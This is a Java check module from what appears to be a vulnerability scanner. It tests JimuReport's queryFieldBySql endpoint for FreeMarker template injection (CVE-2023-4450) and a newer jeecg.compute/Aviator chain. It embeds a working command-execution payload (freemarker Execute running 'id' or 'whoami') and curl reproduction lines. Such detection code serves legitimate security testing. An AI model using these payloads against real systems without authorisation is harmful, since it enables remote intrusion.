package com.jeescan.checks;

import com.jeescan.core.Detector;
import com.jeescan.core.Http;
import com.jeescan.core.Json;
import com.jeescan.core.Result;

/**
 * #1 SSTI — POST /jmreport/queryFieldBySql (CVE-2023-4450)
 *
 * 【POC 来源】主 POC = 网上公开版本（freemarker.template.utility.Execute）
 *             辅助 = 随机算术探针（无副作用，用于安全复检）
 *
 * 网上公开 POC：
 *   {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}'"}
 *
 * 新版链条（CVE-2026-51086/51087，业务对象 jeecg.compute 串联 Aviator）：
 *   {"sql":"select '${jeecg.compute(\"<aviator payload>\")}'"}
 *
 * 严格自检：
 *   A. 基线探活
 *   B. 网上 POC 执行（Execute 类执行命令，看回显）
 *   C. 随机算术探针（无副作用，确认模板求值）
 *   D. 反例（破坏运算符）确认非固定响应
 */
public class SstiQueryFieldBySql extends Detector {

    public SstiQueryFieldBySql() {
        super("1", "queryFieldBySql SSTI",
              "/jmreport/queryFieldBySql", "CVE-2023-4450", "critical", false,
              "主用网上 POC（freemarker Execute），辅以随机算术探针；反例确认非固定响应");
    }

    @Override
    public Result run(Ctx ctx) {
        Result res = newResult();
        Http h = ctx.http;
        String path = ctx.p("jmreport/queryFieldBySql");
        String url = h.url(path);

        // ============ A. 基线 ============
        String baseBody = Json.obj("sql", "select 1");
        Http.Resp base = h.postJson(path, baseBody);
        res.trace("A. 基线探活", "POST", url, baseBody, base, "接口可达性");
        if (isRst(base)) {
            return res.set(Result.State.ERROR, "基线被重置/超时：" + base.err);
        }

        // ============ B. 网上公开 POC（Execute 执行命令） ============
        String cmd = "id";
        String webPoc = "select '<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
                + "${ex(\"" + cmd + "\")}'";
        String webBody = Json.obj("sql", webPoc);
        Http.Resp w = h.postJson(path, webBody);
        res.trace("B. 网上POC Execute 执行 " + cmd, "POST", url, webBody, w,
                "回显含 uid= / 命令输出即为 RCE");

        boolean webHit = has(w, "uid=") || has(w, "gid=")
                || hasIgnoreCase(w, "freemarker.template.utility")
                || hasIgnoreCase(w, "FreeMarker");

        if (webHit) {
            res.ev("网上公开 POC 直接命中（freemarker.template.utility.Execute 执行 " + cmd + "）");
            res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '"
                    + webBody + "'");
            return res.set(Result.State.VULN, "FreeMarker SSTI，Execute 类命令执行成功");
        }

        // ============ B2. 新版链条 ${jeecg.compute()} ============
        String aviator = "=6*7";
        String newPoc = "select '${jeecg.compute(\"" + aviator + "\")}'";
        String newBody = Json.obj("sql", newPoc);
        Http.Resp nw = h.postJson(path, newBody);
        res.trace("B2. 新版链条 jeecg.compute", "POST", url, newBody, nw,
                "CVE-2026-51086/51087 利用路径，期望回显 42");

        if (has(nw, "42")) {
            res.ev("新版链条 jeecg.compute() 串联 Aviator 成功（回显 42）");
            res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '"
                    + newBody + "'");
            return res.set(Result.State.VULN, "FreeMarker + Aviator 沙箱逃逸链命中");
        }

        // ============ C. 随机算术探针（无副作用） ============
        String[] probe = arithProbe();
        String marker = probe[0].substring(1);
        String expect = probe[1];
        String sstiSql = "select '<#assign v=" + marker + ">${v}'";
        String sstiBody = Json.obj("sql", sstiSql);
        Http.Resp p1 = h.postJson(path, sstiBody);
        res.trace("C. 算术探针 " + marker + " (期望 " + expect + ")", "POST", url,
                sstiBody, p1, "模板被求值则应出现 " + expect);

        if (!has(p1, expect)) {
            String alt = "select '${" + marker + "}'";
            String altBody = Json.obj("sql", alt);
            Http.Resp p2 = h.postJson(path, altBody);
            res.trace("C2. 备用探针 ${" + marker + "}", "POST", url, altBody, p2, "换直写形式");
            if (!has(p2, expect)) {
                return res.set(Result.State.SAFE, "网上POC 与算术探针均未命中");
            }
            p1 = p2;
            sstiBody = altBody;
        }

        // ============ D. 反例 ============
        String broken = marker.replace("*", "**").replace("+", "++");
        String negBody = Json.obj("sql", "select '<#assign v=" + broken + ">${v}'");
        Http.Resp neg = h.postJson(path, negBody);
        res.trace("D. 反例（破坏运算符 " + broken + "）", "POST", url, negBody, neg,
                "语法破坏后不复现才算真");
        if (has(neg, expect)) {
            return res.set(Result.State.MAYBE,
                    "正例回显 " + expect + "，但反例同样回显 —— 疑似固定响应");
        }

        res.ev("算术表达式 " + marker + " 被 FreeMarker 求值 → " + expect);
        res.ev("网上 Execute POC 未命中（可能被 SAFER_RESOLVER 拦截），但模板注入本身成立");
        res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '"
                + sstiBody + "'");
        return res.set(Result.State.VULN, "FreeMarker 模板注入确认（Execute 类被拦，算术求值成立）");
    }
}
